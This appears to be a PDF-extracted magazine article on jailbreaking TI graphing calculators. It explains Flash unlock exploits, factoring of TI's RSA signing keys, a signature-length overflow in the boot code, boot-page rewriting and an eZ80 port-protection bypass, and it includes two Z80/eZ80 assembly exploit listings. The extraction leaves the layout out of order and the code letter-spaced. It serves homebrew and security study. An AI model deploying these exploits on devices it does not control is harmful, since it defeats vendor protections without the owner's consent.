are the most interesting models, because these are
upgradeable, in terms of OS upgrades, Flash appli-
cations (which have tighter OS integration and are
stored in Flash instead of RAM), USB ports, and se-
curity implementations to protect some of this cool
new functionality. And whenever something is de-
signed explicitly to keep you from doing something,
it’s always fun to try to break it.
First off, they made the TI-83, then they made
the TI-83 Plus, and then they made the TI-84 Plus,
so there was never actually a plain old TI-84. That
would be confusing, because that would leave you
to believe that because it doesn’t have “Plus” in the
name, it might not have Flash memory.
But of course, TI did make one model called the
“TI-84 Pocket.fr,” which is just a physically-smaller
TI-84 Plus, it’s identical in every way. What’s even
worse, they made a TI-84 Plus Pocket SE which is
just a physically-smaller TI-84 Plus Silver Edition,
except they did put “Plus” in the name.
And then there are all sorts of duplicates of the
exact same calculator, just with a different name on
it. You have the TI-82 Stats and TI-82 Stats.fr,
which are really just TI-83s, you have the TI-83
Plus.fr which could actually be referring to two dif-
ferent calculators, one is just a TI-83 Plus and the
other is a TI-84 Plus Silver Edition.
And then the TI-82 Plus, which is just a TI-83
Plus, and then the TI-83 Premium CE, which is the
same as the TI-84 Plus CE, and then the TI-84 Plus
T, T for “test,” but that’s actually a TI-84 Plus Sil-
ver Edition.
NSpire Models (ARM)
There’s also the TI-Nspire models, which use ARM.
I hate these calculators because they’re big and
bulky, and they were clearly designed for students
and not for engineers. But they do have swappable
keyboards, and probably the most significant one
there is the TI-84 Plus keypad, which causes it to
emulate a TI-84 Plus, making it kind of sort of useful
again. There are versions that don’t have a Com-
puter Algebra System (CAS), and versions that do.
Then came the TI-Nspire CX models, again both
CAS and non-CAS versions. These have color LCDs
and are redesigned to be a little sleeker, so they’re
alright, I guess.
Another big reason to hate these guys is that
they are completely 100 percent locked down, with
no way to execute native code at all. Unless you use
Ndless, which is, for lack of a better term, a jail-
breaking utility along the lines of ZShell. For some
reason, TI fights this really hard. They fix vulner-
abilities that Ndless uses as soon as possible, way
faster than with the other models.
The eZ80 and its Flat Memory Model
And then we have the eZ80 models, the newest mod-
els that have color LCDs. Unlike the Z80 models,
these use an eZ80 CPU with 24-bit addressing and
backward compatibility with Z80 code. The ASIC
and hardware interface is completely new, totally
redesigned with security in mind. Unlike the Z80
models which use a paging or bank-switching sys-
tem, the eZ80 models have a flat memory model,
which will be interesting later on.
The TI-83 Premium CE, hardware-wise, is iden-
tical, but has a different OS on it which includes an
Motorola 68K Models
While the Z80 models are by far my favorite, there
are also a number of Motorola 68K models. These
began with the TI-92, which came out around the
same time the TI-85 did. It has a QWERTY key-
board, which is neat but gets it banned from most
standardized tests. If it as a keyboard, it’s a com-
puter, they say.
34exact math engine and is only sold in Europe. TI re-
ally wants to prevent being able to run this nicer OS
on the US TI-84 Plus CE, but as we’ll see, they’re
not going to succeed in that.
And then finally the TI-84 Plus CE-T, which is
simply the European version of the TI-84 Plus CE.
So having said all that, there are some really cool
things you can do that have nothing to do with cal-
culators, or math, or school. Since some of these
models have On-the-Go USB ports, it is possible to
connect any number of USB peripherals to it, any-
thing from Bluetooth and WiFi adapters so calcula-
tors can communicate wirelessly with each other, to
serial adapters, to keyboards and mice, even USB
flash drives, hard drives, and floppy drives, all of
which exist.
These calculators have a unique USB On-the-Go
controller, one that’s flexible enough to allow real
abuses of the protocol. Probably the best example
of that is when the PlayStation 3 jailbreak first came
out, shortly after OtherOS was taken away.
Well, long story short, it was a USB-based ex-
ploit that required connecting a Teensy or similar
device to your PS3 to enable unsigned code execu-
tion. Of course Teensy’s all over the world quickly
sold out.
So I looked into how it worked and realized that
it essentially simulated a USB hub, then virtually
attached and detached a bunch of fake devices in
order to arrange the heap for a memory corruption
exploit. In order for that to work, the USB pe-
ripheral has to be able to pretend to be other USB
devices by changing its own device address in soft-
ware, and that is something the calculators are able
to do. After I ported the exploit, people were able
to jailbreak their PS3 using a graphing calculator.
You can simulate other USB devices as well, such
as the USB portal used with RFID video games like
Skylanders, Disney Infinity, Lego Dimensions. I’ve
even booted a PC off the calculator by having it
pretend to be a USB Mass Storage device!
They provided an SDK for free, but charged a
hundred dollars for the right to release three Flash
applications in their online store. Naturally, they
wouldn’t want these applications to be pirated, so
they had to restrict how and where these applica-
tions get installed.
They also want to prevent cheating in the class-
room, by locking down the calculators further during
tests and exams.
All of this depends upon preventing tampering of
the operating system, where we could easily disable
or defeat their security mechanisms. In fact, I’m
convinced we could make a better OS than them in
terms of math capabilities and performance.
There user community, of course, wants to main-
tain control over the overpriced hardware that we
own. There are countless numbers of things we can
make these devices do which not only help the cal-
culator community.
Now that we know a little bit about who the
players are, let’s get back into the technical aspects
of how these calculators work, and how the security
is implemented in them, and how we can, have, and
will continue to defeat it.
The First Z80 Flash Vulns
At a hardware level, the Z80 models really consist of
three things: the ASIC, the Flash chip, and then all
the other hardware that the ASIC interacts with,
such as the LCD display, the USB and serial I/O
ports, and the keyboard.
Now, this is not completely accurate as the hard-
ware has changed over the decades. For example,
the RAM wasn’t always internal to the ASIC, and
neither was the CPU, but this is the most common
configuration you would likely come across today.
As I mentioned, the Z80 is a 6MHz CPU with 16-
bit addressing, so it can only access 64KB of mem-
ory at one time. They use bank switching, where
that 64KB is split up logically into four 16KB pages,
also called banks. Each of these banks can hold any
16KB region of memory you want, so if what you
want to access isn’t currently swapped into one of
the banks, you just reconfigure that bank to point
to the 16KB you want, and there it is.
As far as accessing the hardware, the Z80 has 8-
bit I/O addressing, so there’s a maximum of 256 I/O
ports it can talk to. The purpose of each I/O port
is different for each model, but the Flash models all
follow the same basic pattern, which is everything
from port 0x00 all the way up to 0xAF. These do
Why have Security in a Calculator?
Why does TI bother to secure their calculators?
Well, when Flash memory first came into the calcu-
lator world, they sold Flash applications for seven to
fifteen dollars apiece. These applications included a
pocket organizer, spreadsheet applications, a peri-
odic table and enhancements to the built-in math
capabilities. They even published games.
35everything from ASIC configuration, LCD access,
keyboard input, USB control, everything.
Bank
Base Addr
Port
Z80 Memory Banks
0
1
2
0000
4000
8000
06
07
ROM
Page
00 Any
ROM
Page Any
ROM
Page
ROM
Page
7F Any
RAM
Page Any
RAM
Page
to that port. A special sequence of Z80 instructions
has to be fetched and executed from a “privileged”
Flash page before writes to port 0x14 will stick. And
it’s no coincidence that the unlock sequence con-
tains instructions like IM 1 (interrupt mode 1) and
DI (disable interrupts) to explicitly prevent inter-
rupts from interfering with this process.
The privileged page ranges are mentioned there,
but as you can see, the only pages allowed to mod-
ify Flash are the OS and boot pages. So you can’t
modify the OS unless you are the OS or the Boot
Code. That leaves us out of luck for unlocking it
ourselves.
3
C000
(05)
Any
RAM
Page
or
Tricks that Almost Work to Unlock Flash
To give an example with how TI uses this protec-
tion, here’s the logic behind receiving and installing
an OS upgrade. In a loop, the Boot Code will 1)
receive a chunk of OS data and where it should be
written to on the Flash chip, 2) unlock Flash using
that privileged sequence and writing 0x01 to port
0x14, and then checks for a bunch of tricks we might
use to steal control away while it’s unlocked, 3) write
the OS data to the specified area of the Flash chip,
and then finally 4) relock Flash back using the same
privileged sequence as before, writing a 0x00 to lock
it back.
Anytime the OS does something involving mod-
ifying Flash, it will unlock it, perform some simple
operation as quickly as it can, and then relock Flash.
I mentioned it checks for trickery. Specifically,
There are a few rules about how the bank switch-
ing works in the 83+ and 84+ series. As I said, it’s
split up into four banks of 16KB each, starting at
0x0000, 0x4000, 0x8000, and 0xC000.
The first bank, except for some weirdness during
cold boot, always has ROM page 0x00, which is the
start of the OS. The second bank is used to swap in
different chunks of the OS, which is way bigger than
64KB, constantly swapping in what it needs when
it needs it.
The third and fourth banks typically have RAM
pages swapped in, meaning there’s usually 32KB of
RAM accessible to the OS at any given time. Some
of that is User RAM, and some of that is the hard-
ware stack, and then the rest is system RAM that
the OS can use internally.
And as you can see, the last three banks all have
I/O ports that control what page is swapped in. If
you want to swap ROM page 0x01 into the second
bank, you write a 0x01 to I/O port 0x06. Or if you
want to swap RAM page 0x81 into the third bank,
you write 0x81 to I/O port 0x07.
By far the most important I/O port in the en-
tire ASIC is port 0x14, which controls Flash un-
locking and relocking. Whenever the Flash chip is
locked, which is almost always the case, write and
erase commands to the Flash chip are ignored. So
essentially, you cannot modify Flash until you un-
lock it. It also controls whether certain I/O port
values can be modified. We call that a “privileged”
I/O port, because Flash has to be unlocked before
you can write to it. So it doesn’t deal with just
Flash, that’s just what it’s come to be known by.
How port 0x14 works is very simple; you write a
0x01 to unlock it or a 0x00 to lock it back. What’s
not simple, though, is when code is allowed to write
• It checks to make sure that SP, the stack
pointer, lies between 0xC000 and 0xFFF8. It
does this to make sure SP is pointed to some-
where in RAM, so that when it returns back
to the caller, it can get what it assumes would
be a valid return address from the stack.
• It checks to make sure port 0x06 contains a
privileged Flash page, because that’s where
any Flash unlocking code would be running
from.
• It checks port 0x07 to make sure it contains
RAM page 0x01, which is where System RAM
is and what the OS considers the normal sce-
nario.
• It complements the bytes at 0x8000 and
0xC000, which confirms that the third and
fourth banks contain writable RAM pages. I’ll
attempt to illustrate why it does this.
36If only the SP were in ROM
So this would be a really cool way to steal con-
trol away from the OS and Boot Code, but no, they
did think of that. So what next?
Why would TI care if we point SP, the stack pointer,
to an area of Flash? Well, let’s play this out.
For starters, modifying Flash is complicated. It’s
not as simple as loading a register value to a memory
address. It requires a sequence of memory-mapped
commands, commands like Get Chip ID, Erase Sec-
tor, Program Byte, and so on.
If we point SP to a location that’s definitely in
ROM, such as 0x1000, which is deep in ROM page
0x00, and then jump into some code that unlocks
Flash and calls a subroutine, something interesting
happens.
The CALL instruction is going to attempt to
write the return address to the location pointed to
by SP, but because SP is pointing to ROM, a bunch
of 0x80 bytes in this example, those writes are going
to be ignored. So when it finally encounters a return
instruction, it will read the two bytes pointed to by
SP, which is 0x80 and 0x80, and it’ll jump there, to
0x8080. Not at all what the code intended to do,
but because we messed with SP, that’s exactly what
happens.
Executing Misaligned Instructions
Through experimentation, we eventually learned
that the privileged sequence of instructions only
needs to be read from the privileged page; it doesn’t
have to be executed. This requires thinking about
what actually happens on the data bus when in-
structions are being executed.
When it goes to execute the “RLC (Rotate Left
with Carry)” instruction, it first has to read the
bytes that make up that instruction. Because it uses
index register IX, that’s a four byte instruction, so it
reads DD CB 00 00 from the privileged page. Then
it has to actually execute that instruction, and to do
that, it has to read the byte at IX at offset 0. That
is the 0xED byte from the privileged page. Then it
goes to execute the “load HL into D” instruction,
which means it has to read that opcode, which is
0x56 from the privileged page. Then it actually ex-
ecutes it, which means it reads the 0xF3 byte from
the privileged page.
The Z80 equivalent of all those bytes is, coinci-
dentally, “nop; nop; im 1; di,” which is the un-
lock sequence.
The big advantage here is that this does NOT re-
quire actually executing the DI (Disable Interrupts)
instruction or the IM 1 (Interrupt Mode 1) instruc-
tion, which means we could use an interrupt to steal
away control.
So all we need to do is find the instructions on
a privileged page; unfortunately, those are nowhere
to be found. So as awesome as this would be, we
cannot use it.
Paul Courbis’ Books,
Back in Print!
Port 0x05 Swaps the Call Stack’s Bank!
Well, here comes along the TI-83 Plus Silver Edition,
which is an enhanced version of the TI-83 Plus. It
has 128KB of RAM instead of just 32KB, it has a
Flash chip twice as large, and its CPU is capable of
switching between 6MHz and 15MHz. Its ASIC got
a few upgrades as well, namely I/O port 0x05.
This I/O port actually allows controlling the
RAM page swapped into the last bank, something
that couldn’t be done on the original TI-83 Plus.
The thing is, TI didn’t update their Flash unlock
trickery checks to also validate the value of port
0x05. This can be used to our advantage.
Buy them from your favorite purveyor
of fine books. Or from Amazon.
https://www.amazon.com/Paul-Courbis/e/B07Y5GSJWL
37The OS always expects RAM page 0x01 to be
in the third bank, and RAM page 0x00 to be in the
fourth bank. But what happens if we swap the same
RAM page into the last two banks?
Bank
Base Addr
Port
0
0000 1
4000
06 2
8000
07 3
C000
05
ROM
Page
00 ROM
Page
7C RAM
Page
01 RAM
Page
01
the stack and restore the value of port 0x05, and we
have Flash still unlocked, ready for us to use!
Universal Flash Unlock Exploit
That’s great and all, but this port 0x05 trickery only
works on the TI-83 Plus Silver Edition and up. The
original TI-83 Plus has no port 0x05, so it isn’t vul-
nerable to this bug.
Even worse, we had to use an OS hook to steal
control back, we had to hard-code the value of SP
based on the call stack, and we had to hard-code a
return address that starts with 0x00, all of which
could change between OS and Boot Code versions.
What would be really nice is if we had some-
thing that worked on every hardware revision of ev-
ery model in the family, independent of the OS and
Boot Code versions. To do that, we’re going to have
to attack functionality that not only exists on all
models, but isn’t likely or even able to be changed
easily.
One such feature is the OS’ ability to receive
Flash applications from a connected computer or
another calculator. Since Flash applications are
fixed multiples of 16KB in size, even the smallest
Flash application cannot fit in RAM all at once.
That means the OS must, in a loop, receive a chunk
of Flash application data, unlock Flash, write that
chunk to an arbitrary location in Flash, and then re-
lock Flash back, over and over again until all of the
application is received and written to Flash. This
has existed in every OS version for every model since
the beginning, and they cannot take it out, so if pos-
sible, it’s the perfect thing to attack.
Before jumping into the OS code that unlocks
Flash and writes data to an arbitrary destination,
we know we have control over the destination Flash
page and address, the number of bytes to write, and
the bytes to be written, but we don’t have control
over the source address, which is in RAM. That
means bit 7 of H will always be set, and bit 1 of
iy+25h will remain reset. If we could set it, then
the code that wraps DE from 0x8000 back around to
0x4000 will not run, and this routine will write data
to an address above 0x8000, which is all RAM. So
it would effectively turn this command into a RAM-
to-RAM copier.
That’s actually a good thing, because we can
use this to overwrite the data near SP, the stack
pointer, to all the same value, such as 0x8080. When
this routine hits a return instruction, it will jump to
Now things are all kinds of screwed up. Even
though SP, the stack pointer, is pointing to the last
bank, the stack is most certainly not there anymore.
In fact, we have the same page swapped into two
banks at the same time. If I were to write a value
to the first byte of the third bank, I would actually
be able to read it from the first byte of the fourth
bank! That’s definitely very interesting.
What we need is to find a section of the OS, or
Boot Code, that unlocks Flash, writes a value to
the third bank, and then attempts to relock Flash
back. As luck would have it, there’s a very con-
venient block of code that does that. There is a
particular bit, and in fact an entire byte, of the cer-
tificate region of Flash that holds whether the OS is
valid or not. If it’s valid, as it usually is, the value
will be 0x00.
What we can do is jump directly into the Boot
Code at the point that it unlocks Flash, just before
it reads this byte from the certificate. It will read it
and store it to an area of System RAM called OP1,
which is in the third bank, at address 0x8478.
Since we have just used I/O port 0x05 to swap
RAM page 0x01 into both of the last two banks,
writing a zero to 0x8478 will also write a zero to
0xC478, which is exactly 16KB ahead, in the fourth
bank.
If we craft things just right, we can set SP so
that by the time it gets to the write to 0x8478, SP
will be pointing to 0x8478. When it performs that
write, it will corrupt the return address that SP is
pointing to.
If the return address used to be 0x46E1, writing
that zero has changed it to 0x00E1. So as soon as
the code hits the return instruction, it’s not going
to return to the Boot Code. It’s going to return
to 0x00E1 instead, which is deep in the OS inter-
rupt, in ROM page 0x00. We can use an OS cursor
hook at that point to steal control away, clean up
382
4
6
8
10
12
14
16
18
20
22
24
26
28
30
32
34
36
38
40
42
44
46
. nolist
#include " t i 8 3 p l u s . i n c "
. list
. o r g userMem−2
UnlockFlash :
; Unlocks F l a s h p r o t e c t i o n .
; D e s t r o y s : appBackUpScreen
;
pagedCount
;
pagedGetPtr
;
arcInfo
;
iMathPtr5
;
pagedBuf
;
ramCode
in a , ( 6 )
push a f
l d a , 7 Bh
c a l l translatePage
out ( 6 ) , a
l d hl , 5 0 9 2 h
ld e , ( hl )
inc hl
ld d , ( hl )
inc hl
ld a , ( hl )
c a l l translatePage
out ( 6 ) , a
ex de , h l
l d a , 0CCh
l d bc , 0 FFFFh
cpir
ld e , ( hl )
inc hl
ld d , ( hl )
push de
pop i x
l d hl , 9 8 9 8 h
l d ( h l ) , 0 C3h
inc hl
l d ( h l ) , r e t u r n P o i n t & 11111111 b
inc hl
l d ( h l ) , r e t u r n P o i n t >> 8
l d hl , pagedBuf
ld ( hl ) ,98h
l d de , pagedBuf+1
l d bc , 4 9
ldir
48
50
52
54
56
58
60
62
64
66
68
70
72
74
76
78
80
82
84
86
88
90
l d ( iMathPtr5 ) , sp
l d hl , ( iMathPtr5 )
l d de , 9 A00h
l d bc , 5 0
ldir
l d de , ( iMathPtr5 )
l d hl , −12
add hl , de
l d ( iMathPtr5 ) , h l
l d i y , 0 0 5 6 h−25h
ld a ,50
l d ( pagedCount ) , a
ld a ,8
ld ( arcInfo ) , a
jp ( ix )
translatePage :
ld b , a
in a , ( 2 )
and 80h
j r z , _is83P
in a ,(21 h)
and 3
ld a , b
r e t nz
and 3Fh
ret
_is83P : l d a , b
and 1Fh
ret
returnPoint :
ld iy , f l a g s
l d hl , ( iMathPtr5 )
l d de , 1 2
add hl , de
l d sp , h l
ex de , h l
l d hl , 9 A00h
l d bc , 5 0
ldir
pop a f
out ( 6 ) , a
ret
. end
end
Universal Unlock Exploit for the TI 83+ Family
390x8080 instead, where we can take control, clean up
the stack, and return with Flash still unlocked.
So how can we ensure bit 1 of IY+25h is set even
when this routine will start out by resetting it?
If we point iy-25h to a point in Flash where bit
1 is set, then the Boot Code’s attempt to reset it
with the res (Reset Bit) instruction will not work.
If you remember, modifying Flash involves memory-
mapped commands to program one byte at a time,
so the set and res instructions will have no effect.
See page 39 for a working example.
Now, this is all entirely dependent on the fact
that they never set iy after Flash is unlocked, so
it’s fixed easily enough in the OS. But similar func-
tionality exists in the Boot Code, and that can’t
be easily fixed, certainly not on existing hardware.
And even if they did fix it, there are a number of
other Flash unlock exploits that can be used. I have
about a dozen different methods that I’ve never dis-
closed, just in case TI ever starts to get aggressive
with fixing these things.
what was long disregarded, that it was possible to
factor these keys. So he posted about it online, and
very shortly after, TI silenced him.
They actually sent someone to his home to talk
to him, to strongly encourage him not to work on
this anymore, not even to talk about it. As you can
imagine, this scared the crap out of him.
But, the damage was done, and the commu-
nity knew what was possible. They took the re-
maining thirteen public keys and started a BOINC
distributed computing project to factor the rest of
them. We had hundreds, thousands of people all
helping to factor the keys as quickly as possible, and
before we knew it, we had all thirteen private keys
in just one month, all under TI’s nose and without
them finding out.
Since no one ever had the OS keys, or even the
application keys on most models, there were no tools
to sign modified OSes or applications. I threw some
together, validated that every single key was correct
and could produce OSes and Flash applications that
each calculator would accept, and published those
tools along with the key files needed to use them. 20
That seemed to be the final straw for TI, because
they sent me a DMCA takedown notice.
Were it not for the EFF, the Electronic Frontier
Foundation, stepping in and offering to defend me
legally against TI’s threats, I would’ve been forced
to comply. The EFF sent a letter to Texas Instru-
ments stating that it isn’t possible to copyright a
number, which is essentially what I published, and
that they should leave me alone because it isn’t
worth destroying a person over. TI did not respond
to that letter, so the matter was dropped, and I’m
still hosting the 512-bit keys to this day.
Knowing that they had lost this particular bat-
tle, TI started using impossible-to-factor 2048-bit
RSA keys in newly-manufactured models of the TI-
84 Plus ad TI-84 Plus Silver Edition. Since the hard-
ware was never designed to validate such a large
signature, validating the OS now takes six minutes!
This is simply unacceptable, so we’ll have to fall
back on Flash unlock exploits again to undo this.
RSA Key Factoring
Being able to unlock Flash and modify it ourselves
is nice, but if we wanted to write our own OS,
we’d have to rely on custom OS receivers, which
are platform-dependent, error-prone, and just trou-
blesome to mess with. It would be nice if we could
just patch the OS and re-sign it ourselves, or write
our own OS and sign it, with TI’s private RSA key.
But of course, they aren’t going to just hand that
key over to us.
Flash-upgradeable Z80 models started around
the time that the TI-73 came out, and that was
around 1997. And in 1997, 512-bit RSA keys were
looking pretty secure. If you don’t know, RSA’s
strength is in the inability to factor the public key,
which is an extremely large number, into two prime
numbers. And computing power not being what it
is today, that was considered impossible at the time.
But, flash forward ten years or so, and one person
decided to give it a shot anyway on his computer.
He used something called the General Number Field
Sieve, which, at least at the time, and maybe still so,
was considered the fastest and most efficient known
method of factoring numbers into primes. He kicked
off the process for the TI-83 Plus OS signing key and
let it run on his computer for two months or so be-
fore it finally spit out the primes. He had proven
20 unzip
pocorgtfo20.pdf ti83pluskeys.zip
40Defeating the 2048-bit Signature; or,
John Hancock Corrupts the Call Stack
to the start of the OS.
The nice thing about this technique is that no
custom OS transfer tools are required. We just cre-
ate a specially-crafted OS upgrade file. Better still,
this exploits the read-only Boot Code, so all models
manufactured so far are vulnerable.
So to get rid of this six minute validation, we have
to understand how the calculator boots and how OS
upgrades work.
When first turning the calculator on, the Boot
Code is the first thing to get control. It does some
basic hardware initialization, then checks the OS
valid marker stored on sector 0 of the Flash chip. If
that marker is valid, it jumps into the OS, and the
calculator starts normally. If that marker is NOT
valid, then it waits to receive a new, valid OS over
one of the link ports.
For a typical OS transfer, the first thing the Boot
Code will do is invalidate the OS both in the certifi-
cate and by erasing Flash sector 0, which will reset
the OS valid marker. In a loop, it keeps receiving
small chunks of the OS over and over into RAM, and
then unlocking Flash, writing that to its destination,
and then re-locking Flash. Once that’s all done, it’s
time for the Boot Code to validate the 512-bit sig-
nature in the OS, which is effectively useless now
because we can generate that signature ourselves.
Then, it goes to validate the 2048-bit signature. And
if all those checks pass, it marks the OS as valid in
Flash sector 0 and the certificate, and then it jumps
into it.
Digging in a little further, let’s look at how it
validates this 2048-bit signature. Unlike the origi-
nal 512-bit signature, this new one is stored length-
indexed, meaning that there’s a word at the begin-
ning indicating it’s 256 bytes. If you know the signa-
ture is 2048-bit, or 256 bytes, why store the length?
It opens up the possibility that it could be exploited,
and as it turns out, yes, they don’t bounds-check this
length, so we can take advantage of it.
We can embed a really large signature into the
OS update. Because the Boot Code doesn’t check
that it’s a sane value, it will blindly copy the sig-
nature to the start of RAM, at 0x8000. So we can
store 0x80 bytes of garbage there, then a Z80 jump
instruction, which is opcode C3 followed by the ad-
dress. Then we can put lots and lots and lots of
0x80s that eventually will totally overwrite RAM
including the stack.
The next time the code tries to return, it returns
to address 0x8080, where we have a jump to where
we calculated the payload would really be at.
Once we get control, we can do some cleanup,
such as marking the OS as valid both on Flash sec-
tor 0 and in the certificate, and then just jumping
Patching the 84+ Boot Code
Another big discovery in the community, and an-
other nail in the coffin on the security of the TI-83
Plus and TI-84 Plus series, has to do with modifying
what should be read-only boot sectors.
One thing I noticed is that the TI-84 Plus and
TI-84 Plus Silver Edition boot sectors are almost
identical. In fact, other than the fact that the first
one has a 1MB Flash chip and the other one is 2MB,
they are identical calculators in every way, except for
one little I/O write.
When the calculator is first booting and initial-
izing hardware and I/O, it writes either a 0x00 or
a 0x01 to I/O port 0x21. Now, this is a protected
port, which means Flash has to be unlocked before
it can be written to. But, both calculators run ex-
actly the same OS, which reads the value of port
0x21, bit 0 specifically, to determine which model
it’s running on. It’s critical that it know this, for a
very important reason: the OS is actually organized
into two sections.
The Flash layout for the TI-84 Plus is on page 42.
It has 0x40 Flash pages. The first OS section is at
the very beginning of the Flash chip at sector 0, and
it runs from Flash page 0x00 to page 0x08. Near the
end of the Flash chip is the second part of the OS;
these are the privileged pages. Both the upper OS
page range and the boot page are privileged, but the
boot page is supposedly read-only.
And then in between the two OS sections is
the user archive, where Flash applications, archived
variables, and so on are stored.
The Flash layout for the TI-84 Plus Silver Edi-
tion is basically the same, except that the Silver
Edition has a Flash chip that’s twice as big. The
boot page is now 0x7F instead of 0x3F, and the up-
per OS page range is 0x7C and 0x7D, instead of 0x3C
and 0x3D.
The Boot Code initially sets the value of I/O
port 0x21, indicating which model it is, but what
would happen if we unlock Flash and modify it our-
selves? If a TI-84 Plus Silver Edition writes a 0x00
to port 0x21, then the OS would believe it’s actually
a TI-84 Plus non-Silver Edition, and vice versa.
41TI-84+ Flash Layout (Non-Silver Edition)
Flash Pages
User Archive
Flash Pages
Flash Page
Flash Apps
0x3C to 0x3D
0x3F
0x00 to 0x08
Archived Vars
Upper OS
Boot Page
Lower OS
Privileged
Privileged
Read Only
TI-84+ Flash Layout (Silver Edition)
Flash Pages
User Archive
Flash Pages
Flash Page
Flash Apps
0x7C to 0x7D
0x7F
0x00 to 0x08
Archived Vars
Upper OS
Boot Page
Lower OS
Privileged
Privileged
Read Only
Now, normally this would just crash the calcu-
lator, because it would suddenly be looking at page
0x3C, for example, when what it really wanted was
0x7C. But, I had an idea that I could just copy the
upper OS pages and the boot page to the middle of
the Flash chip, from pages 0x3C to 0x3F. So, when
the OS went to look for page 0x3C, it would actually
find it, and it would continue to function normally.
That effectively cuts the user archive in half. So
that was my thought, I could force the OS to only
think half the user archive was there.
But, when I tried to put this into practice by
changing port 0x21 and copying pages 0x7C through
0x7F to 0x3C through 0x3F, the copy operation
wouldn’t work. It turns out, there’s a really good
reason for that.
When I changed the value of port 0x21, I
changed which range was read-only! By changing
the value of port 0x21, I actually changed the pro-
tection from one region to another. So all this time,
we thought the Flash chip itself was edit-locked on
the boot page, but no, it was the ASIC’s port 0x21
keeping it edit-locked. By temporarily flipping the
value of port 0x21, we can actually modify the Boot
Code!
To write to page 0x7F on an 84+SE, we just
write 0x00 to I/O port 0x21, effectively making it
temporarily not a Silver Edition. Then we perform
the Flash sector erase and write while the page is un-
privileged, then restore port 0x21’s value to 0x01,
making it an SE again.
On the 84+, we do the same thing in reverse by
writing 0x01 to port 0x21 to make it temporarily
a fake SE, then overwriting the Boot Code page at
0x3F while it is no longer protected!
This made it possible to modify the Boot Code,
and modify it we did! We made diagnostic utili-
ties and embedded them in the boot page so that
it was impossible to permanently brick it, and–most
importantly–we can simply patch out the 2048-bit
signature check.
Naturally, when they figured out we could do
this, they changed the way the calculators were man-
ufactured. They now edit-lock the boot sector on
the Flash chip, so the ASIC protection is redundant.
The 84+ Color Silver Ed Uses Our Bug!
Here’s the really fun part: Shortly after, TI came out
with their first and only calculator to have a color
LCD and the classic Z80 architecture. Not only did
it have a color LCD, but it had a 4MB Flash chip
instead of 2MB, and they called it the TI-84 Plus
C Silver Edition, C for color. That’s the only dif-
ference between it and the older models. They even
used exactly the same ASIC, even though it wasn’t
designed to work with a Flash chip beyond 2MB.
The problem is, the 4MB Flash chip has a dif-
ferent sector layout compared to the 1MB and 2MB
Flash chips used in earlier models. The supposedly
read-only boot pages at the end of the 2MB Flash
chip are now in the middle of the 4MB Flash chip,
which is part of the new calculator’s user archive. So
in other words, TI now needs to write to the pages
that the ASIC is designed to protect. So what did
TI do?
They used our workaround! They temporarily
toggle which region is protected, because they can’t
just turn it off, all they can do is misconfigure it
a different way, do their writes, and then toggle it
back.
Did they get the idea from us?
42New Protections of the TI 84+ CE eZ80’s Backward Compatibility Can Bite
The constant toggling of port 0x21 actually slows
the calculator down too much, so they dropped the
TI-84 Plus C Silver Edition in favor of the TI-84
Plus CE, a brand new color calculator with an eZ80
CPU.
The eZ80 sports Z80 backwards compatibility, so
it can run regular old Z80 instructions in addition to
the new eZ80 ones, which support 24-bit addressing
and a 16-bit I/O range instead of just an 8-bit one.
Since they now have 24-bit addressing, they ditched
the paging and bank switching model in favor of a
flat memory model. The eZ80 has backwards compatibility for running
code in Z80 mode. (The native eZ80 mode is called
ADL mode.) Even better, any individual instruc-
tion can run in ADL mode or in Z80 mode. In
ADL mode, you can call a subroutine that runs in
Z80 mode, and when it returns, you’re back in ADL
mode. And even better than that, in that Z80 mode
subroutine, you can have ADL instructions such as
those 16-bit port OUT and IN instructions.
It’s all very convenient, so surely the protection
on the protected I/O ports works in both ADL mode
and Z80 mode, right? No, no it doesn’t.
To effectively negate the protection, we just set
the upper bounds of the privileged range to be re-
ally high, something like 0xFE0000. On line 28 of
this example, we temporarily jump into Z80 mode
to execute a single instruction, one that writes to
the protected ports 0x001D through 0x001F, which
really should not work, and then returns back to the
eZ80 ADL mode.
Start
0x000000
0x200000
Varies
TI-84+ CE Flash Regions
Length
Name
0x200000 Boot
Priv, RO
Varies
OS
Priv, Writable
Varies
User
They also revamped the port protection, since
there are no “privileged pages” anymore. Now, cer-
tain address ranges are considered privileged. And
certain I/O ports, mainly any where the high byte
is 0x00, are considered protected and can only be
written to from a privileged address range.
The Boot region at the start of the Flash chip
is read-only and always privileged, and then the
variable-sized OS follows it. The rest is the User
archive. Since the size of the OS can vary from ver-
sion to version, the ASIC has to be configured at
runtime to know which parts of the Flash chip to
consider privileged. That range is configured via
protected I/O ports 0x001D through 0x001F, which
can only be modified by code in the privileged re-
gion. So how do the protected I/O ports work?
Well, with any privileged I/O port write, TI
must load a constant value into a register, write
that register value to the protected I/O port, and
then immediately verify that register contains the
same constant value they just loaded. They have to
do that because otherwise, we could just jump into
the Boot Code right before the port write with our
own value. That’s tedious, but they have a bunch
of macros to do this kind of stuff for them.
The problem, though, is that the OS size is vari-
able, not constant. It’s not something they can
hard-code. So, we could set our own register value
and jump into the Boot Code right before the port
0x001D I/O write. Then, we could steal control
away through a variety of means, interrupts, what-
ever.
2
4
6
8
10
12
14
16
18
20
22
24
26
28
30
32
34
43
OpenAllPortAccess :
l d a , 0 FEh
l d hl , 0 0 0 0 h
WriteAccessPortAHL :
l d . s i s bc , 0 0 1Dh
WriteBCPortAHL :
push a f
ld a , l
c a l l DoProtectedWrite
ld a , h
i n c bc
c a l l DoProtectedWrite
pop a f
i n c bc
DoProtectedWrite :
di
push bc
push h l
push de
l d hl , d o _ p r o t e c t e d _ w r i t e
l d de , RAMstart
l d bc , ( do_protected_write_end
− do_protected_write )
ldir
pop de
pop h l
pop bc
j p . s i s 0000 h
do_protected_write_finish :
ret
do_protected_write :
out ( c ) , a
jp . l i l do_protected_write_finish
do_protected_write_end :Someone over there really should have caught
this. These new models are less secure than the
ones from twenty years ago, and they were trying
to improve upon that security. In my opinion, the
original unlock protection used on the TI-83 Plus
and TI-84 Plus series would have worked, so long
as they stay on top of code-related exploits. (They
didn’t, of course.)
So far as this protection goes, the I/O port pro-
tection is likely in the ASIC just like before, and
can’t be fixed through software updates.
Recalling how they used the awkward 0x21
workaround in the TI-84 Plus C Silver Edition
rather than patch the ASIC, this ASIC bug is likely
here to stay. But, just in case it’s not, there are
other ways.
An Old Exploit for the TI 82 Advanced
To bring things full circle, there is a new model in
Europe called the TI-82 Advanced, which in hard-
ware is really a TI-84 Plus non-Silver Edition with-
out the 2.5mm I/O port.
This model is very locked down compared to the
others. No more assembly program execution; no
more Flash applications transferred from a PC. The
